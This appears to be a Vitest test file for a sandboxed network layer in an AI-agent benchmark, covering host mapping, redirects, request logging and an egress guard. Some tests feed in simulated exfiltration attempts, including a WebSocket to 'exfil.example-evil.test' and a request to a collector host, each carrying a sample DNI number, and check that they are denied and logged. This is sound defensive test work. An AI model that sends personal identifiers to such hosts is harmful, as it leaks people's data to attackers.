import http from 'node:http';
import type { AddressInfo } from 'node:net';
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest';
import type { HostEvalConfig } from '../../src/contracts';
import { createEgressGuard } from '../../src/net/egress-guard';
import { HostTable } from '../../src/net/hosts';
import { NetLog } from '../../src/net/netlog';
import { docAddress } from '../../src/net/wire';
import { createWorldFetch, withCallContext } from '../../src/net/world-fetch';
import {
  BENCH_HOSTS,
  CLAVE,
  COLLECTOR,
  type FakeBench,
  IDP,
  PORTAL,
  startFakeBench,
  UNMAPPED,
} from './fake-bench';

let bench: FakeBench;
beforeAll(async () => {
  bench = await startFakeBench();
});
afterAll(async () => {
  await bench.close();
});
afterEach(() => {
  bench.requests.length = 0;
});

function setup(
  over: Partial<{
    unmapped: HostEvalConfig['unmapped'];
    mockOrigin: string;
    now: () => Date;
    connectTimeoutMs: number;
  }> = {},
) {
  const hosts = HostTable.fromBenchHosts(BENCH_HOSTS, [{ pattern: COLLECTOR, kind: 'collector' }]);
  const log = new NetLog({ worldId: 'run-1' });
  const fetch = createWorldFetch(
    {
      worldId: 'run-1',
      mockOrigin: over.mockOrigin ?? bench.origin,
      scoringOrigin: bench.scoringOrigin,
      routes: hosts,
      unmapped: over.unmapped ?? { mode: 'enotfound' },
    },
    log,
    { connectTimeoutMs: over.connectTimeoutMs, now: over.now },
  );
  return { fetch, log, hosts };
}

async function failure(
  promise: Promise<unknown>,
): Promise<TypeError & { cause: Error & { code?: string } }> {
  try {
    await promise;
  } catch (err) {
    return err as TypeError & { cause: Error & { code?: string } };
  }
  throw new Error('expected a failure');
}

describe('createWorldFetch: mapped hosts', () => {
  it('keeps the real URL and Host and sends the contract headers', async () => {
    const { fetch, log } = setup();
    const res = await withCallContext({ tool: 'fetch_url', toolCallId: 'call-7' }, () =>
      fetch(`https://${PORTAL}/echo?x=1`, { headers: { 'x-custom': 'a' } }),
    );
    expect(res.status).toBe(200);
    expect(res.url).toBe(`https://${PORTAL}/echo?x=1`);
    expect(res.redirected).toBe(false);
    expect(await res.json()).toMatchObject({
      world: 'run-1',
      source: 'fetch_url',
      host: PORTAL,
      proto: 'https',
      harness: '1',
    });
    const seen = bench.requests[0];
    expect(seen?.hostHeader).toBe(PORTAL);
    expect(seen?.host).toBe(PORTAL);
    expect(seen?.path).toBe('/echo?x=1');
    expect(seen?.headers['x-custom']).toBe('a');
    expect(seen?.headers['user-agent']).toBe('node');
    expect(seen?.headers['accept-encoding']).toBe('identity');

    const [record] = log.tail();
    expect(record).toMatchObject({
      worldId: 'run-1',
      channel: 'fetch_url',
      toolCallId: 'call-7',
      method: 'GET',
      url: `https://${PORTAL}/echo?x=1`,
      host: PORTAL,
      route: 'mapped',
      status: 200,
      reqHeaders: { 'x-custom': 'a' },
    });
    expect(record?.bench).toEqual({ kind: 'ok', page: '/echo', seq: seen?.seq });
    expect(record?.resBytes).toBeGreaterThan(0);
    // The record shows what the agent sent, not the harness' own headers.
    expect(Object.keys(record?.reqHeaders ?? {}).some((h) => h.startsWith('x-spainbench'))).toBe(
      false,
    );
  });

  it('shows the agent only what a real site would send', async () => {
    const { fetch } = setup();
    const res = await fetch(`https://${PORTAL}/set-cookie`);
    const names = [...res.headers.keys()];
    expect(names).not.toContain('server');
    expect(names).not.toContain('x-powered-by');
    expect(names.filter((n) => n.startsWith('x-spainbench'))).toEqual([]);
    expect(names).not.toContain('connection');
    expect(res.headers.getSetCookie()).toHaveLength(3);
    expect(res.statusText).toBe('OK');
    const missing = await fetch(`https://${PORTAL}/nope`);
    expect(missing.status).toBe(404);
    expect(missing.statusText).toBe('Not Found');
  });

  it('overwrites whatever x-spainbench-* and Host the caller sets', async () => {
    const { fetch, log } = setup();
    await withCallContext({ tool: 'run_script' }, () =>
      fetch(`https://${PORTAL}/echo`, {
        headers: {
          'X-SpainBench-World': 'other-world',
          'x-spainbench-source': 'browser',
          'x-spainbench-host': COLLECTOR,
          host: COLLECTOR,
        },
      }),
    );
    const seen = bench.requests[0];
    expect(seen?.headers['x-spainbench-world']).toBe('run-1');
    expect(seen?.headers['x-spainbench-source']).toBe('run_script');
    expect(seen?.headers['x-spainbench-host']).toBe(PORTAL);
    expect(seen?.hostHeader).toBe(PORTAL);
    // The forgery attempt is on the record.
    expect(log.tail()[0]?.reqHeaders['x-spainbench-world']).toBe('other-world');
  });

  it('attributes concurrent calls to their own tool call', async () => {
    const { fetch, log } = setup();
    await Promise.all([
      withCallContext({ tool: 'fetch_url', toolCallId: 'a' }, async () => {
        await new Promise((r) => setTimeout(r, 20));
        await fetch(`https://${PORTAL}/echo?who=a`);
      }),
      withCallContext({ tool: 'run_script', toolCallId: 'b' }, async () => {
        await fetch(`https://${PORTAL}/echo?who=b`);
        await fetch(`https://${PORTAL}/echo?who=b2`);
      }),
      fetch(`https://${PORTAL}/echo?who=none`),
    ]);
    const byUrl = Object.fromEntries(
      log.tail().map((r) => [r.url.split('?')[1], [r.channel, r.toolCallId]]),
    );
    expect(byUrl).toEqual({
      'who=a': ['fetch_url', 'a'],
      'who=b': ['run_script', 'b'],
      'who=b2': ['run_script', 'b'],
      'who=none': ['other', undefined],
    });
    const sources = Object.fromEntries(
      bench.requests.map((r) => [r.path.split('?')[1], r.headers['x-spainbench-source']]),
    );
    expect(sources).toMatchObject({
      'who=a': 'fetch_url',
      'who=b': 'run_script',
      'who=none': 'other',
    });
  });

  it('sends request bodies and the content type fetch would imply', async () => {
    const { fetch, log } = setup();
    const post = async (body: BodyInit, headers: Record<string, string> = {}) => {
      const res = await fetch(`https://${PORTAL}/post`, { method: 'POST', body, headers });
      return res.json() as Promise<{ method: string; body: string; type?: string }>;
    };
    expect(await post('dni=53918274H')).toEqual({
      method: 'POST',
      body: 'dni=53918274H',
      type: 'text/plain;charset=UTF-8',
    });
    expect(await post('{"a":1}', { 'Content-Type': 'application/json' })).toMatchObject({
      type: 'application/json',
    });
    expect(await post(new URLSearchParams({ a: 'ñ', b: '2' }))).toMatchObject({
      body: 'a=%C3%B1&b=2',
      type: 'application/x-www-form-urlencoded;charset=UTF-8',
    });
    const form = new FormData();
    form.set('naf', '283174209647');
    expect((await post(form)).type).toMatch(/^multipart\/form-data; boundary=/);
    const binary = new Uint8Array([0, 1, 2, 250]);
    const res = await fetch(`https://${PORTAL}/post`, { method: 'POST', body: binary });
    expect(res.status).toBe(200);
    const records = log.tail();
    expect(records[0]).toMatchObject({
      reqBody: 'dni=53918274H',
      reqBodyBytes: 13,
      method: 'POST',
    });
    expect(records[3]?.reqBody).toContain('283174209647');
    expect(records[4]).toMatchObject({
      reqBodyEncoding: 'base64',
      reqBody: Buffer.from(binary).toString('base64'),
    });
    expect(bench.requests[4]?.headers['content-length']).toBe('4');
  });

  it('accepts a Request and rejects what fetch rejects', async () => {
    const { fetch } = setup();
    const request = new Request(`https://${PORTAL}/post`, {
      method: 'POST',
      body: 'hola',
      headers: { 'x-r': '1' },
    });
    const res = await fetch(request);
    expect(await res.json()).toMatchObject({ body: 'hola' });
    expect(bench.requests[0]?.headers['x-r']).toBe('1');
    await expect(fetch(`https://${PORTAL}/x`, { method: 'GET', body: 'x' })).rejects.toThrow(
      /cannot have body/,
    );
    await expect(fetch(`https://user:pw@${PORTAL}/x`)).rejects.toThrow(/credentials/);
    await expect(fetch('not a url')).rejects.toThrow(/Failed to parse URL/);
    const scheme = await failure(fetch('ftp://portal.example-gov.test/x'));
    expect(scheme.message).toBe('fetch failed');
    await expect(fetch(`https://${PORTAL}/x`, { method: 'TRACE' })).rejects.toThrow(/unsupported/);
    expect(bench.requests).toHaveLength(1);
  });

  it('returns no body for HEAD and 304, and decodes compressed bodies', async () => {
    const { fetch, log } = setup();
    const head = await fetch(`https://${PORTAL}/echo`, { method: 'HEAD' });
    expect(head.status).toBe(200);
    expect(head.body).toBeNull();
    const notModified = await fetch(`https://${PORTAL}/empty-304`);
    expect(notModified.status).toBe(304);
    expect(await notModified.text()).toBe('');
    const gz = await fetch(`https://${PORTAL}/gzip`);
    expect(await gz.text()).toBe('comprimido');
    expect(log.tail().map((r) => [r.status, r.resBytes])).toEqual([
      [200, 0],
      [304, 0],
      [200, undefined], // compressed: the declared length is not the body's
    ]);
  });

  it('streams the body as it arrives', async () => {
    const { fetch, log } = setup();
    const res = await fetch(`https://${PORTAL}/slow-stream`);
    const reader = res.body?.getReader();
    const first = await reader?.read();
    expect(Buffer.from(first?.value ?? []).toString()).toBe('uno ');
    let rest = '';
    for (;;) {
      const chunk = await reader?.read();
      if (!chunk || chunk.done) break;
      rest += Buffer.from(chunk.value).toString();
    }
    expect(rest).toBe('dos');
    expect(log.tail()).toHaveLength(1);
    expect(log.tail()[0]).toMatchObject({ status: 200 });
    expect(log.tail()[0]?.error).toBeUndefined();
  });

  it('records the request when the answer arrives, even if the body is never read', async () => {
    const { fetch, log } = setup();
    await fetch(`https://${PORTAL}/endless`, { headers: { 'x-d': '53918274H' } });
    expect(log.tail()).toHaveLength(1);
    expect(log.tail()[0]).toMatchObject({ status: 200, reqHeaders: { 'x-d': '53918274H' } });
  });

  it('answers with the frozen clock when there is one', async () => {
    const { fetch } = setup({ now: () => new Date('2026-10-16T09:30:00Z') });
    const res = await fetch(`https://${PORTAL}/echo`);
    expect(res.headers.get('date')).toBe('Fri, 16 Oct 2026 09:30:00 GMT');
  });

  it('never exposes the mock when it is down', async () => {
    const dead = http.createServer();
    await new Promise<void>((r) => dead.listen(0, '127.0.0.1', () => r()));
    const port = (dead.address() as AddressInfo).port;
    await new Promise<void>((r) => dead.close(() => r()));
    const { fetch, log } = setup({ mockOrigin: `http://127.0.0.1:${port}` });
    const err = await failure(fetch(`https://${PORTAL}/echo`));
    expect(err.message).toBe('fetch failed');
    expect(err.cause.code).toBe('ECONNREFUSED');
    expect(err.cause.message).toBe(`connect ECONNREFUSED ${docAddress(PORTAL)}:443`);
    expect(`${err.message} ${err.cause.message}`).not.toContain('127.0.0.1');
    expect(log.tail()[0]?.error).toContain('ECONNREFUSED');
  });

  it('refuses a mock origin that is not loopback http', () => {
    const hosts = new HostTable([PORTAL]);
    const log = new NetLog({ worldId: 'w' });
    const make = (mockOrigin: string) =>
      createWorldFetch(
        {
          worldId: 'w',
          mockOrigin,
          scoringOrigin: 'http://127.0.0.1:3020',
          routes: hosts,
          unmapped: { mode: 'enotfound' },
        },
        log,
      );
    expect(() => make('http://203.0.113.5:3010')).toThrow(/loopback/);
    expect(() => make('https://127.0.0.1:3010')).toThrow(/loopback/);
    expect(() => make('http://spainbench.internal:3010')).toThrow(/loopback/);
    expect(() => make('http://127.0.0.1:3010')).not.toThrow();
  });

  it('refuses a mock origin that is the scoring listener, under any loopback name', () => {
    const make = (mockOrigin: string, scoringOrigin: string) =>
      createWorldFetch(
        {
          worldId: 'w',
          mockOrigin,
          scoringOrigin,
          routes: new HostTable([PORTAL]),
          unmapped: { mode: 'enotfound' },
        },
        new NetLog({ worldId: 'w' }),
      );
    expect(() => make('http://127.0.0.1:3010', 'http://127.0.0.1:3010')).toThrow(/scoring/);
    expect(() => make('http://127.0.0.1:3010', 'http://localhost:3010')).toThrow(/scoring/);
    expect(() => make('http://127.0.0.1:3010', 'http://[::ffff:127.0.0.1]:3010')).toThrow(
      /scoring/,
    );
    expect(() => make('http://127.0.0.1:3010', 'http://127.0.0.1:3020')).not.toThrow();
  });
});

describe('createWorldFetch: configuration', () => {
  it('takes the host eval config as the run writes it, with route patterns', async () => {
    const config: HostEvalConfig = {
      worldId: 'run-9',
      mockOrigin: bench.origin,
      scoringOrigin: bench.scoringOrigin,
      routes: [PORTAL, '*.example-gov.test'],
      unmapped: { mode: 'enotfound' },
      netlog: '/not/used/here.jsonl',
      llm: { extraAllowOrigins: [] },
      research: { shape: 'auto', answers: [] },
      now: '2026-10-16T09:30:00+02:00',
    };
    const log = new NetLog({ worldId: config.worldId });
    const fetch = createWorldFetch(config, log);
    const res = await fetch(`https://${IDP}/whoami`);
    expect(res.status).toBe(200);
    expect(bench.requests[0]?.headers['x-spainbench-world']).toBe('run-9');
    await failure(fetch(`https://${UNMAPPED}/`));
    // Patterns that could map this machine are refused when the transport is built.
    expect(() => createWorldFetch({ ...config, routes: ['127.0.0.1'] }, log)).toThrow(
      /cannot be mapped/,
    );
  });
});

describe('createWorldFetch: redirects', () => {
  it('follows by default across mapped hosts and records every hop', async () => {
    const { fetch, log } = setup();
    const res = await fetch(`https://${PORTAL}/login`);
    expect(res.url).toBe(`https://${PORTAL}/back`);
    expect(res.redirected).toBe(true);
    expect(await res.text()).toContain('De vuelta');
    expect(bench.requests.map((r) => `${r.host}${r.path.split('?')[0]}`)).toEqual([
      `${PORTAL}/login`,
      `${IDP}/sso`,
      `${CLAVE}/auth`,
      `${PORTAL}/back`,
    ]);
    // The mock built the absolute URLs from the forwarded scheme and Host: nothing is rewritten.
    expect(log.tail().map((r) => [r.host, r.status])).toEqual([
      [PORTAL, 302],
      [IDP, 303],
      [CLAVE, 302],
      [PORTAL, 200],
    ]);
  });

  it('returns the redirect itself with redirect: manual and rewrites the mock origin in Location', async () => {
    const { fetch } = setup();
    const manual = await fetch(`https://${PORTAL}/login`, { redirect: 'manual' });
    expect(manual.status).toBe(302);
    expect(manual.headers.get('location')).toBe(
      `https://${IDP}/sso?return=${encodeURIComponent(`https://${PORTAL}/back`)}`,
    );
    const leaky = await fetch(`https://${PORTAL}/leaky-redirect`, { redirect: 'manual' });
    expect(leaky.headers.get('location')).toBe(`https://${PORTAL}/back`);
    expect(leaky.headers.get('location')).not.toContain('127.0.0.1');
    const followed = await fetch(`https://${PORTAL}/leaky-redirect`);
    expect(followed.url).toBe(`https://${PORTAL}/back`);
  });

  it('resolves relative locations', async () => {
    const { fetch } = setup();
    const res = await fetch(`https://${PORTAL}/relative`);
    expect(res.url).toBe(`https://${PORTAL}/back?from=relative`);
  });

  it('applies the spec: 303 and POST+301 become GET, 307 keeps method and body', async () => {
    const { fetch } = setup();
    const post = (path: string) =>
      fetch(`https://${PORTAL}${path}`, {
        method: 'POST',
        body: 'a=1',
        headers: { 'content-type': 'text/plain' },
      }).then((r) => r.json() as Promise<{ method: string; body: string; type?: string }>);
    expect(await post('/r303')).toEqual({ method: 'GET', body: '', type: undefined });
    expect(await post('/r301')).toEqual({ method: 'GET', body: '', type: undefined });
    expect(await post('/r307')).toEqual({ method: 'POST', body: 'a=1', type: 'text/plain' });
  });

  it('drops credentials when a redirect leaves the origin', async () => {
    const { fetch } = setup();
    await fetch(`https://${PORTAL}/to-idp`, {
      headers: { authorization: 'Bearer x', cookie: 's=1', 'x-keep': 'k' },
    });
    const [first, second] = bench.requests;
    expect(first?.headers.authorization).toBe('Bearer x');
    expect(second?.host).toBe(IDP);
    expect(second?.headers.authorization).toBeUndefined();
    expect(second?.headers.cookie).toBeUndefined();
    expect(second?.headers['x-keep']).toBe('k');
  });

  it('fails like fetch on redirect: error and on a loop', async () => {
    const { fetch, log } = setup();
    const err = await failure(fetch(`https://${PORTAL}/login`, { redirect: 'error' }));
    expect(err.message).toBe('fetch failed');
    expect(err.cause.message).toBe('unexpected redirect');
    const loop = await failure(fetch(`https://${PORTAL}/loop`));
    expect(loop.cause.message).toBe('redirect count exceeded');
    expect(log.tail().length).toBeGreaterThanOrEqual(21);
  });

  it('routes every hop again: a redirect to an unmapped host fails like a dead domain', async () => {
    const { fetch, log } = setup();
    const err = await failure(fetch(`https://${PORTAL}/to-unmapped`));
    expect(err.cause.code).toBe('ENOTFOUND');
    expect(err.cause.message).toBe(`getaddrinfo ENOTFOUND ${UNMAPPED}`);
    expect(log.tail().map((r) => [r.host, r.route])).toEqual([
      [PORTAL, 'mapped'],
      [UNMAPPED, 'unmapped'],
    ]);
  });
});

describe('createWorldFetch: hosts that are not mapped', () => {
  it('fails like a dead domain and never reaches the mock', async () => {
    const { fetch, log } = setup();
    const err = await withCallContext({ tool: 'run_script', toolCallId: 'c' }, () =>
      failure(
        fetch(`https://${UNMAPPED}/x?naf=283174209647`, { method: 'POST', body: 'dni=53918274H' }),
      ),
    );
    expect(err).toBeInstanceOf(TypeError);
    expect(err.message).toBe('fetch failed');
    expect(err.cause).toMatchObject({
      code: 'ENOTFOUND',
      syscall: 'getaddrinfo',
      hostname: UNMAPPED,
      message: `getaddrinfo ENOTFOUND ${UNMAPPED}`,
    });
    expect(bench.requests).toHaveLength(0);
    expect(log.tail()[0]).toMatchObject({
      channel: 'run_script',
      toolCallId: 'c',
      route: 'unmapped',
      host: UNMAPPED,
      method: 'POST',
      reqBody: 'dni=53918274H',
      error: expect.stringContaining('ENOTFOUND'),
    });
  });

  it('never maps loopback, whatever the table says', async () => {
    const { fetch } = setup();
    const scoring = new URL(bench.scoringOrigin);
    for (const url of [
      bench.scoringOrigin,
      `http://localhost:${scoring.port}/`,
      `http://[::1]:${scoring.port}/`,
    ])
      await failure(fetch(`${url}/state`));
    expect(bench.scoringHits).toEqual([]);
  });

  it('refuses an IP address as a closed port: a number has no DNS to fail', async () => {
    const { fetch, log } = setup();
    for (const [url, address] of [
      ['https://8.8.8.8/x', '8.8.8.8:443'],
      ['http://203.0.113.9:8080/', '203.0.113.9:8080'],
      ['http://[2001:4860:4860::8888]/', '2001:4860:4860::8888:80'],
    ] as const) {
      const err = await failure(fetch(url));
      expect(err.cause.code, url).toBe('ECONNREFUSED');
      expect(err.cause.message, url).toBe(`connect ECONNREFUSED ${address}`);
    }
    expect(log.tail().map((r) => r.route)).toEqual(['unmapped', 'unmapped', 'unmapped']);
    expect(bench.requests).toHaveLength(0);
    // A name keeps failing as a name, and the mode of the config still applies to it.
    expect((await failure(fetch(`https://${UNMAPPED}/`))).cause.code).toBe('ENOTFOUND');
  });

  it('serves a mapped host on its own ports only (80 and 443), and refuses the rest like a closed port', async () => {
    const { fetch, log } = setup();
    const scoring = new URL(bench.scoringOrigin).port;
    for (const url of [
      `https://${PORTAL}:8443/echo`,
      `http://${PORTAL}:6379/`,
      `https://${PORTAL}:${scoring}/health`,
      `https://${PORTAL}:80/`,
      `http://${PORTAL}:443/`,
    ]) {
      const err = await failure(fetch(url));
      expect(err.cause.code, url).toBe('ECONNREFUSED');
      expect(err.cause.message, url).toBe(
        `connect ECONNREFUSED ${docAddress(PORTAL)}:${new URL(url).port}`,
      );
    }
    expect(bench.requests).toHaveLength(0);
    expect(bench.scoringHits).toEqual([]);
    expect(log.tail().every((r) => r.route === 'unmapped')).toBe(true);
    // An attempt on the collector's odd port is still on the record, with what it sent.
    await failure(fetch(`http://${COLLECTOR}:8080/verificar?d=53918274H`, { method: 'GET' }));
    expect(log.tail().at(-1)).toMatchObject({
      host: COLLECTOR,
      url: `http://${COLLECTOR}:8080/verificar?d=53918274H`,
      route: 'unmapped',
    });
    // The default ports, spelled out or not, work.
    expect((await fetch(`https://${PORTAL}:443/echo`)).status).toBe(200);
    expect((await fetch(`http://${PORTAL}:80/echo`)).status).toBe(200);
  });

  it('can refuse the connection, time out, or answer a 404 instead', async () => {
    const refused = await failure(
      setup({ unmapped: { mode: 'econnrefused' } }).fetch(`https://${UNMAPPED}/`),
    );
    expect(refused.cause.code).toBe('ECONNREFUSED');
    expect(refused.cause.message).toBe(`connect ECONNREFUSED ${docAddress(UNMAPPED)}:443`);

    const slow = setup({ unmapped: { mode: 'timeout' }, connectTimeoutMs: 30 });
    const timeout = await failure(slow.fetch(`https://${UNMAPPED}:8443/`));
    expect(timeout.cause.code).toBe('UND_ERR_CONNECT_TIMEOUT');
    expect(timeout.cause.message).toBe(
      `Connect Timeout Error (attempted address: ${UNMAPPED}:8443, timeout: 30ms)`,
    );
    expect(slow.log.tail()[0]?.route).toBe('unmapped');

    const notFound = setup({ unmapped: { mode: 'status', status: 404 } });
    const res = await notFound.fetch(`https://${UNMAPPED}/inicio`);
    expect(res.status).toBe(404);
    expect(res.statusText).toBe('Not Found');
    expect(await res.text()).toContain('Not Found');
    expect(notFound.log.tail()[0]).toMatchObject({ route: 'unmapped', status: 404 });
    expect(bench.requests).toHaveLength(0);
  });

  it('stops waiting for an unmapped host when the caller aborts', async () => {
    const slow = setup({ unmapped: { mode: 'timeout' }, connectTimeoutMs: 60_000 });
    const controller = new AbortController();
    const pending = failure(slow.fetch(`https://${UNMAPPED}/`, { signal: controller.signal }));
    setTimeout(() => controller.abort(), 20);
    expect((await pending).name).toBe('AbortError');
    await expect(
      slow.fetch(`https://${UNMAPPED}/`, { signal: AbortSignal.abort() }),
    ).rejects.toMatchObject({ name: 'AbortError' });
  });
});

describe('createWorldFetch: abort', () => {
  it('rejects with the abort reason, before and during the exchange', async () => {
    const { fetch, log } = setup();
    await expect(
      fetch(`https://${PORTAL}/echo`, { signal: AbortSignal.abort() }),
    ).rejects.toMatchObject({
      name: 'AbortError',
    });
    const controller = new AbortController();
    const res = await fetch(`https://${PORTAL}/endless`, { signal: controller.signal });
    const reading = res.arrayBuffer();
    setTimeout(() => controller.abort(new Error('stop')), 20);
    await expect(reading).rejects.toThrow(/stop/);
    expect(log.tail().map((r) => r.status)).toEqual([undefined, 200]); // the first never left
  });

  it('honours AbortSignal.timeout like fetchPublic does', async () => {
    const { fetch } = setup();
    const res = await fetch(`https://${PORTAL}/endless`, { signal: AbortSignal.timeout(30) });
    await expect(res.text()).rejects.toMatchObject({ name: 'TimeoutError' });
  });
});

describe('createEgressGuard', () => {
  const llm = { origin: '' };
  let server: http.Server;
  beforeAll(async () => {
    server = http.createServer((req, res) => {
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ path: req.url, auth: req.headers.authorization }));
    });
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()));
    llm.origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  });
  afterAll(async () => {
    server.closeAllConnections();
    await new Promise<void>((r) => server.close(() => r()));
  });

  it('lets the model gateway through and logs metadata only', async () => {
    const log = new NetLog({ worldId: 'w' });
    const guard = createEgressGuard({ allowOrigins: [llm.origin], log });
    const res = await guard.fetch(`${llm.origin}/v1/chat/completions?api_key=secret`, {
      method: 'POST',
      headers: { authorization: 'Bearer sk-live' },
      body: '{"messages":[{"content":"mi DNI es 53918274H"}]}',
    });
    expect(await res.json()).toEqual({
      path: '/v1/chat/completions?api_key=secret',
      auth: 'Bearer sk-live',
    });
    expect(log.tail()).toHaveLength(1);
    const record = log.tail()[0];
    expect(record).toMatchObject({
      channel: 'llm',
      route: 'llm',
      method: 'POST',
      url: `${llm.origin}/v1/chat/completions`,
      status: 200,
      reqHeaders: {},
    });
    expect(record?.reqBody).toBeUndefined();
    expect(JSON.stringify(record)).not.toMatch(/sk-live|secret|53918274H/);
  });

  it('denies every other origin without touching the network, and says what was tried', async () => {
    const log = new NetLog({ worldId: 'w' });
    const realFetch = vi.fn();
    const guard = createEgressGuard({
      allowOrigins: [llm.origin],
      log,
      fetch: realFetch as unknown as typeof fetch,
    });
    const err = await withCallContext({ tool: 'boe_search', toolCallId: 'b1' }, () =>
      failure(
        guard.fetch('https://www.boe.es/datosabiertos/api/legislacion?q=naf%3D283174209647', {
          method: 'post',
          headers: { Authorization: 'Bearer sk-x', 'x-d': '53918274H' },
          body: JSON.stringify({ dni: '53918274H' }),
        }),
      ),
    );
    expect(err.message).toBe('fetch failed');
    expect(err.cause.code).toBe('ENOTFOUND');
    expect(realFetch).not.toHaveBeenCalled();
    expect(log.tail()[0]).toMatchObject({
      channel: 'boe_search',
      toolCallId: 'b1',
      route: 'denied',
      method: 'POST',
      url: 'https://www.boe.es/datosabiertos/api/legislacion?q=naf%3D283174209647',
      host: 'www.boe.es',
      reqBody: '{"dni":"53918274H"}',
      reqHeaders: { authorization: '«redacted»', 'x-d': '53918274H' },
    });
    expect(log.tail()[0]?.error).toContain('denied');
    // A Request is judged the same way.
    await failure(
      guard.fetch(new Request('https://api.exa.ai/search', { method: 'POST', body: 'q=1' })),
    );
    expect(log.tail()[1]).toMatchObject({ route: 'denied', reqBody: 'q=1' });
    expect(realFetch).not.toHaveBeenCalled();
  });

  it('does not allow another port or scheme of an allowed host', async () => {
    const log = new NetLog({ worldId: 'w' });
    const realFetch = vi.fn(async () => new Response('ok'));
    const guard = createEgressGuard({
      allowOrigins: ['https://chatgpt.com'],
      log,
      fetch: realFetch as unknown as typeof fetch,
    });
    await guard.fetch('https://chatgpt.com/backend-api/x');
    await failure(guard.fetch('http://chatgpt.com/backend-api/x'));
    await failure(guard.fetch('https://chatgpt.com:8443/backend-api/x'));
    await failure(guard.fetch('https://evil.chatgpt.com/backend-api/x'));
    expect(realFetch).toHaveBeenCalledTimes(1);
  });

  it('allows an origin added later (the model, once it is known), wss as https', async () => {
    const log = new NetLog({ worldId: 'w' });
    const realFetch = vi.fn(async () => new Response('ok'));
    const guard = createEgressGuard({
      allowOrigins: [],
      log,
      fetch: realFetch as unknown as typeof fetch,
    });
    await failure(guard.fetch('https://chatgpt.com/x'));
    guard.allow('wss://chatgpt.com');
    expect(guard.allowedOrigins()).toEqual(['https://chatgpt.com']);
    await guard.fetch('https://chatgpt.com/x');
    expect(realFetch).toHaveBeenCalledTimes(1);
  });

  it('records a failing gateway call and rethrows it', async () => {
    const log = new NetLog({ worldId: 'w' });
    const boom = new TypeError('fetch failed');
    const guard = createEgressGuard({
      allowOrigins: [llm.origin],
      log,
      fetch: (async () => {
        throw boom;
      }) as typeof fetch,
    });
    await expect(guard.fetch(`${llm.origin}/v1/x`)).rejects.toBe(boom);
    expect(log.tail()[0]).toMatchObject({ route: 'llm', error: 'fetch failed' });
  });

  it('lets fetch fail by itself for a URL that cannot be parsed', async () => {
    const log = new NetLog({ worldId: 'w' });
    const guard = createEgressGuard({ allowOrigins: [], log, fetch: globalThis.fetch });
    await expect(guard.fetch('not a url')).rejects.toThrow();
    expect(log.tail()).toHaveLength(0);
  });

  it('replaces the globals and puts them back', async () => {
    const before = { fetch: globalThis.fetch, WebSocket: globalThis.WebSocket };
    const log = new NetLog({ worldId: 'w' });
    const guard = createEgressGuard({ allowOrigins: [llm.origin], log });
    const uninstall = guard.install();
    try {
      expect(globalThis.fetch).toBe(guard.fetch);
      expect(globalThis.WebSocket).toBe(guard.WebSocket);
      await failure(globalThis.fetch('https://api.openai.com/v1/models'));
      expect(await (await globalThis.fetch(`${llm.origin}/ok`)).json()).toMatchObject({
        path: '/ok',
      });
    } finally {
      uninstall();
    }
    expect(globalThis.fetch).toBe(before.fetch);
    expect(globalThis.WebSocket).toBe(before.WebSocket);
    expect(log.tail().map((r) => r.route)).toEqual(['denied', 'llm']);
  });

  describe('WebSocket', () => {
    class FakeSocket {
      static CONNECTING = 0;
      static OPEN = 1;
      static CLOSING = 2;
      static CLOSED = 3;
      constructor(
        readonly url: string,
        readonly protocols?: unknown,
      ) {}
    }

    it('connects to the gateway for real and logs it', () => {
      const log = new NetLog({ worldId: 'w' });
      const guard = createEgressGuard({
        allowOrigins: ['https://chatgpt.com'],
        log,
        WebSocket: FakeSocket as unknown as typeof WebSocket,
      });
      const ws = new guard.WebSocket('wss://chatgpt.com/backend-api/codex/responses?x=1', {
        headers: { a: 'b' },
      } as never);
      expect(ws).toBeInstanceOf(FakeSocket);
      expect((ws as unknown as FakeSocket).protocols).toEqual({ headers: { a: 'b' } });
      expect(guard.WebSocket.OPEN).toBe(1);
      expect(log.tail()[0]).toMatchObject({
        route: 'llm',
        channel: 'llm',
        url: 'wss://chatgpt.com/backend-api/codex/responses',
      });
    });

    it('gives anything else a socket that fails like a dead host', async () => {
      const log = new NetLog({ worldId: 'w' });
      const guard = createEgressGuard({
        allowOrigins: ['https://chatgpt.com'],
        log,
        WebSocket: FakeSocket as unknown as typeof WebSocket,
      });
      const ws = await withCallContext(
        { tool: 'run_script' },
        async () => new guard.WebSocket('wss://exfil.example-evil.test/c?d=53918274H'),
      );
      expect(ws).not.toBeInstanceOf(FakeSocket);
      expect(ws.readyState).toBe(0);
      expect(() => ws.send('x')).toThrow(/CONNECTING/);
      const events: string[] = [];
      let code: number | undefined;
      ws.addEventListener('error', () => events.push('error'));
      ws.onclose = (e) => {
        events.push('close');
        code = (e as CloseEvent).code;
      };
      await vi.waitFor(() => expect(events).toEqual(['error', 'close']));
      expect(code).toBe(1006);
      expect(ws.readyState).toBe(3);
      expect(log.tail()[0]).toMatchObject({
        route: 'denied',
        channel: 'run_script',
        url: 'wss://exfil.example-evil.test/c?d=53918274H',
        host: 'exfil.example-evil.test',
      });
    });

    it('throws the real constructor error for an invalid URL', () => {
      const log = new NetLog({ worldId: 'w' });
      const guard = createEgressGuard({ allowOrigins: [], log, WebSocket: globalThis.WebSocket });
      expect(() => new guard.WebSocket('not a url')).toThrow();
    });
  });
});
